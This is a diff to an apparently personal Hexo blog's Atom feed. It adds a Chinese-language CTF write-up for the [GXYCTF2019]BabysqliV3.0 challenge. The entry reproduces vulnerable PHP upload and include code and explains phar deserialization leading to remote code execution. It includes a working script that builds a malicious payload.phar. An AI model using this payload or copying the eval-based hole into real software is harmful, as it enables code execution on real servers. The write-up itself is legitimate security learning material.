@@ -3,7 +3,7 @@
     <id>http://odiws.github.io</id>
     <title>Hexo • Posts by &#34;phar反序列化&#34; tag</title>
     <link href="http://odiws.github.io" />
-    <updated>2024-06-08T13:00:07.000Z</updated>
+    <updated>2024-08-21T04:16:34.000Z</updated>
     <category term="buuctf" />
     <category term="system_file" />
     <category term="sql文件读取" />
@@ -57,6 +57,175 @@
     <category term="xss攻击" />
     <category term="c的预处理" />
     <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
+    <entry>
+        <id>http://odiws.github.io/2024/08/21/GXYCTF2019-BabysqliV3-0/</id>
+        <title>[GXYCTF2019]BabysqliV3.0</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/08/21/GXYCTF2019-BabysqliV3-0/"/>
+        <content type="html">&lt;h2 id=&#34;gxyctf2019babysqliv30&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gxyctf2019babysqliv30&#34;&gt;#&lt;/a&gt; [GXYCTF2019]BabysqliV3.0&lt;/h2&gt;
+&lt;p&gt;文件包含获取源码：&lt;/p&gt;
+&lt;p&gt;home.php&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+session_start();
+echo &amp;quot;&amp;lt;meta http-equiv=\&amp;quot;Content-Type\&amp;quot; content=\&amp;quot;text/html; charset=utf-8\&amp;quot; /&amp;gt; &amp;lt;title&amp;gt;Home&amp;lt;/title&amp;gt;&amp;quot;;
+error_reporting(0);
+if(isset($_SESSION[&#39;user&#39;]))&amp;#123;
+    if(isset($_GET[&#39;file&#39;]))&amp;#123;
+        if(preg_match(&amp;quot;/.?f.?l.?a.?g.?/i&amp;quot;, $_GET[&#39;file&#39;]))&amp;#123;
+            die(&amp;quot;hacker!&amp;quot;);
+        &amp;#125;
+        else&amp;#123;
+            if(preg_match(&amp;quot;/home$/i&amp;quot;, $_GET[&#39;file&#39;]) or preg_match(&amp;quot;/upload$/i&amp;quot;, $_GET[&#39;file&#39;]))&amp;#123;
+                $file = $_GET[&#39;file&#39;].&amp;quot;.php&amp;quot;;
+            &amp;#125;
+            else&amp;#123;
+                $file = $_GET[&#39;file&#39;].&amp;quot;.fxxkyou!&amp;quot;;
+            &amp;#125;
+            echo &amp;quot;å½åå¼ç¨çæ¯ &amp;quot;.$file;
+            require $file;
+        &amp;#125;
+        
+    &amp;#125;
+    else&amp;#123;
+        die(&amp;quot;no permission!&amp;quot;);
+    &amp;#125;
+&amp;#125;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;upload.php&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot; /&amp;gt; 
+
+&amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
+    ä¸ä¼ æä»¶
+    &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; /&amp;gt;
+    &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;ä¸ä¼ &amp;quot; /&amp;gt;
+&amp;lt;/form&amp;gt;
+
+&amp;lt;?php
+error_reporting(0);
+class Uploader&amp;#123;
+    public $Filename;
+    public $cmd;
+    public $token;
+    
+
+    function __construct()&amp;#123;
+        $sandbox = getcwd().&amp;quot;/uploads/&amp;quot;.md5($_SESSION[&#39;user&#39;]).&amp;quot;/&amp;quot;;
+        $ext = &amp;quot;.txt&amp;quot;;
+        @mkdir($sandbox, 0777, true);
+        if(isset($_GET[&#39;name&#39;]) and !preg_match(&amp;quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&amp;quot;, $_GET[&#39;name&#39;]))&amp;#123;
+            $this-&amp;gt;Filename = $_GET[&#39;name&#39;];
+        &amp;#125;
+        else&amp;#123;
+            $this-&amp;gt;Filename = $sandbox.$_SESSION[&#39;user&#39;].$ext;
+        &amp;#125;
+
+        $this-&amp;gt;cmd = &amp;quot;echo &#39;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;Master, I want to study rizhan!&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&#39;;&amp;quot;;
+        $this-&amp;gt;token = $_SESSION[&#39;user&#39;];
+    &amp;#125;
+
+    function upload($file)&amp;#123;
+        global $sandbox;
+        global $ext;
+
+        if(preg_match(&amp;quot;[^a-z0-9]&amp;quot;, $this-&amp;gt;Filename))&amp;#123;
+            $this-&amp;gt;cmd = &amp;quot;die(&#39;illegal filename!&#39;);&amp;quot;;
+        &amp;#125;
+        else&amp;#123;
+            if($file[&#39;size&#39;] &amp;gt; 1024)&amp;#123;
+                $this-&amp;gt;cmd = &amp;quot;die(&#39;you are too big (â²â½`ã)&#39;);&amp;quot;;
+            &amp;#125;
+            else&amp;#123;
+                $this-&amp;gt;cmd = &amp;quot;move_uploaded_file(&#39;&amp;quot;.$file[&#39;tmp_name&#39;].&amp;quot;&#39;, &#39;&amp;quot; . $this-&amp;gt;Filename . &amp;quot;&#39;);&amp;quot;;
+            &amp;#125;
+        &amp;#125;
+    &amp;#125;
+
+    function __toString()&amp;#123;
+        global $sandbox;
+        global $ext;
+        // return $sandbox.$this-&amp;gt;Filename.$ext;
+        return $this-&amp;gt;Filename;
+    &amp;#125;
+
+    function __destruct()&amp;#123;
+        if($this-&amp;gt;token != $_SESSION[&#39;user&#39;])&amp;#123;
+            $this-&amp;gt;cmd = &amp;quot;die(&#39;check token falied!&#39;);&amp;quot;;
+        &amp;#125;
+        eval($this-&amp;gt;cmd);
+    &amp;#125;
+&amp;#125;
+
+if(isset($_FILES[&#39;file&#39;])) &amp;#123;
+    $uploader = new Uploader();
+    $uploader-&amp;gt;upload($_FILES[&amp;quot;file&amp;quot;]);
+    if(@file_get_contents($uploader))&amp;#123;
+        echo &amp;quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&amp;lt;br&amp;gt;&amp;quot;.$uploader.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
+        echo file_get_contents($uploader);
+    &amp;#125;
+&amp;#125;
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可操控的参数和命令执行函数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$this-&amp;gt;Filename = $_GET[&#39;name&#39;];
+
+eval($this-&amp;gt;cmd);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上传代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if(@file_get_contents($uploader))&amp;#123;
+        echo &amp;quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&amp;lt;br&amp;gt;&amp;quot;.$uploader.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
+        echo file_get_contents($uploader);
+    &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;观察了一下代码，发现应该是一个反序列化，但是有没有发现反序列化代码，确定是一道 phar 反序列化题目&lt;/p&gt;
+&lt;p&gt;由于使用文件操作函数配合伪协议 &lt;code&gt;phar://&lt;/code&gt;  读取文件可触发反序列化，从而导致 rce.&lt;/p&gt;
+&lt;p&gt;基于这样的想法，这里便上传一个 &lt;code&gt;.phar&lt;/code&gt;  文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;function __destruct()&amp;#123;
+        if($this-&amp;gt;token != $_SESSION[&#39;user&#39;])&amp;#123;
+            $this-&amp;gt;cmd = &amp;quot;die(&#39;check token falied!&#39;);&amp;quot;;
+        &amp;#125;
+        eval($this-&amp;gt;cmd);
+    &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里还需要获得 user 的 session&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if(isset($_GET[&#39;name&#39;]) and !preg_match(&amp;quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&amp;quot;, $_GET[&#39;name&#39;]))&amp;#123;
+            $this-&amp;gt;Filename = $_GET[&#39;name&#39;];
+        &amp;#125;
+        else&amp;#123;
+            $this-&amp;gt;Filename = $sandbox.$_SESSION[&#39;user&#39;].$ext;
+        &amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;随便上传个文件得到 session&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BGXYCTF2019%5DBabysqliV3.0/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;构造一下上传的文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;class Uploader&amp;#123;
+    public $Filename;
+    public $cmd;
+    public $token;
+    function __destruct()&amp;#123;
+        eval($this-&amp;gt;cmd);
+    &amp;#125;
+&amp;#125;
+
+$o = new Uploader();
+$o-&amp;gt;cmd = &#39;phpinfo();&#39;;#
+$o-&amp;gt;token = &#39;d41d8cd98f00b204e9800998ecf8427e&#39;;
+$phar = new Phar(&amp;quot;payload.phar&amp;quot;);
+$phar -&amp;gt;startBuffering();
+$phar -&amp;gt; setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER();?&amp;quot;);
+$phar -&amp;gt; setMetadata($o);
+$phar -&amp;gt; addFromString(&amp;quot;test.txt&amp;quot;,&amp;quot;you are hacked&amp;quot;);
+$phar -&amp;gt; stopBuffering();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;换一下 cmd 就行了。&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="phar反序列化" />
+        <updated>2024-08-21T04:16:34.000Z</updated>
+    </entry>
     <entry>
         <id>http://odiws.github.io/2024/06/08/[SWPUCTF%202018]SimplePHP/</id>
         <title>[SWPUCTF 2018]SimplePHP</title>
